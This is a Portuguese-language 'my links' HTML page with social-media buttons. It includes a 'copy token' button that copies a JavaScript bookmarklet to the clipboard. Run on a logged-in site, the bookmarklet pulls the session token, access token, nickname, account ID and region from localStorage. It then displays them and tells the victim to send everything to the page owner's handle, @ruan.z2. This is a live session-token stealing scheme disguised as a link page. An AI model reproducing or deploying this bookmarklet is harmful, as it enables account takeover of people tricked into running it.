<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Meus Links</title>
<style>
body {
  background: #0a0a0a;
  color: #fff;
  font-family: Arial, sans-serif;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  height: 100vh;
  margin: 0;
  animation: fadeIn 1s ease forwards;
}
h1 {
  margin-bottom: 25px;
  font-size: 32px;
  text-shadow: 0 0 10px #00eaff, 0 0 25px #00eaff;
  animation: glow 2.2s ease-in-out infinite alternate;
}
button {
  width: 260px;
  padding: 15px;
  font-size: 18px;
  border: none;
  border-radius: 10px;
  cursor: pointer;
  margin: 10px 0;
  font-weight: bold;
  transition: 0.25s ease;
  outline: none;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 10px;
}
#btnCopyPC { background: #00eaff; color: #000; box-shadow: 0 0 12px #00eaff, 0 0 25px #00eaff inset; }
#btnCopyPC:hover { transform: scale(1.07); box-shadow: 0 0 18px #00eaff, 0 0 35px #00eaff inset; }
#btnDiscord { background: #5865F2; color:white; box-shadow:0 0 12px #5865F2; }
#btnDiscord:hover { transform: scale(1.07); box-shadow:0 0 20px #5865F2; }
#btnInsta { background: #ff2dab; color:white; box-shadow:0 0 12px #ff2dab; }
#btnInsta:hover { transform: scale(1.07); box-shadow:0 0 22px #ff2dab; }
#btnTikTok { background: #000; color:white; box-shadow:0 0 12px #00fff2; border:2px solid #00fff2; }
#btnTikTok:hover { transform: scale(1.07); box-shadow:0 0 22px #00fff2; }
@keyframes fadeIn { from {opacity:0; transform:translateY(20px);} to{opacity:1; transform:translateY(0);} }
@keyframes glow { from {text-shadow:0 0 10px #00eaff;} to{ text-shadow:0 0 25px #00eaff; } }
button img { display: block; }
</style>
</head>
<body>

<h1>Meus links</h1>

<!-- Bot√£o bookmarklet -->
<button id="btnCopyPC">üìã Copiar Token (PC & iOS)</button>

<!-- Bot√µes links -->
<button id="btnDiscord">
  <img src="https://cdn-icons-png.flaticon.com/512/2111/2111370.png" width="26" height="26">
  Entrar no Discord
</button>
<button id="btnInsta">
  <img src="https://cdn-icons-png.flaticon.com/512/2111/2111463.png" width="26" height="26">
  Meu Instagram
</button>
<button id="btnTikTok">
  <img src="https://cdn-icons-png.flaticon.com/512/3046/3046121.png" width="26" height="26">
  Meu TikTok
</button>

<script>
// Bookmarklet que ser√° copiado
const bookmarkletPC = `javascript:(function(){
  let panel=document.createElement('div');
  panel.style.cssText='position:fixed;top:50%;left:50%;transform:translate(-50%,-50%) scale(0);opacity:0;background:#0f0f0f;color:#00ffea;padding:20px;border-radius:10px;width:350px;max-width:90vw;font-family:Courier New,monospace;z-index:99999;box-shadow:0 0 20px #00ffe0,0 0 40px #00ffe0;transition:all 0.3s ease;';
  panel.innerHTML=\`
<h3 style="text-align:center;margin:0 0 10px 0;border-bottom:1px solid #00ffe0;padding-bottom:5px;font-size:14px;">üîç Dados Extra√≠dos</h3>
<pre id="npData" style="background:#111;padding:10px;border-radius:8px;max-height:220px;overflow:auto;white-space:pre-wrap;font-size:13px;"></pre>
<p style="text-align:center;font-size:13px;margin-top:10px;">üì® <b>Envie todos esses dados para:</b> üëâ <b>@ruan.z2</b></p>
<div style="display:flex;justify-content:center;margin-top:10px;gap:10px;">
<button id="copyBtn" style="background:#00ffea;color:#000;padding:6px 12px;font-weight:bold;border-radius:6px;cursor:pointer;font-size:13px;">üìã Copiar</button>
<button id="closeBtn" style="background:#00ffea;color:#000;padding:6px 12px;font-weight:bold;border-radius:6px;cursor:pointer;font-size:13px;">‚ùå Fechar</button>
</div>\`;
  document.body.appendChild(panel);
  setTimeout(()=>{panel.style.transform='translate(-50%,-50%) scale(1)';panel.style.opacity='1';},50);
  
  let token = localStorage.getItem("token")||"‚ùå N√£o encontrado";
  let pa = localStorage.getItem("persist:auth");
  let eat="‚ùå N√£o encontrado", nick="‚ùå N√£o encontrado", acc="‚ùå N√£o encontrado", reg="‚ùå N√£o encontrado";
  try{
    if(pa){
      let p1=JSON.parse(pa);
      if(p1.param){
        let p2=JSON.parse(p1.param);
        eat=p2.eat||eat;
        nick=p2.nickname||nick;
        acc=p2.account_id||acc;
        reg=p2.region||reg;
      }
    }
  }catch(e){}

  document.getElementById('npData').innerText=\`üîë TOKEN:\n${token}\n\nüîê ACESS_TOKEN (EAT):\n${eat}\n\nüë§ NICK:\n${nick}\n\nüÜî ID:\n${acc}\n\nüåé REGI√ÉO:\n${reg}\`;

  document.getElementById('copyBtn').onclick=function(){
    const temp = document.createElement('textarea');
    temp.value = document.getElementById('npData').innerText;
    document.body.appendChild(temp);
    temp.select();
    document.execCommand('copy');
    temp.remove();
    this.innerText='‚úî Copiado!';
    setTimeout(()=>{this.innerText='üìã Copiar';},1500);
  };

  document.getElementById('closeBtn').onclick=function(){
    panel.style.transform='translate(-50%,-50%) scale(0.8)';
    panel.style.opacity='0';
    setTimeout(()=>{panel.remove();},300);
  };
})();`;

// Copiar bookmarklet
document.getElementById('btnCopyPC').addEventListener('click', ()=>{
  const temp = document.createElement('textarea');
  temp.value = bookmarkletPC;
  document.body.appendChild(temp);
  temp.select();
  document.execCommand('copy');
  temp.remove();
  alert('üìã Bookmarklet PC & iOS copiado!');
});

// Abrir links
document.getElementById('btnDiscord').addEventListener('click', ()=>window.open('https://discord.gg/KEQn5pPsWg','_blank'));
document.getElementById('btnInsta').addEventListener('click', ()=>window.open('https://www.instagram.com/ruan.z2/?hl=pt-br','_blank'));
document.getElementById('btnTikTok').addEventListener('click', ()=>window.open('https://www.tiktok.com/@ruan.z2','_blank'));
</script>

</body>
</html>
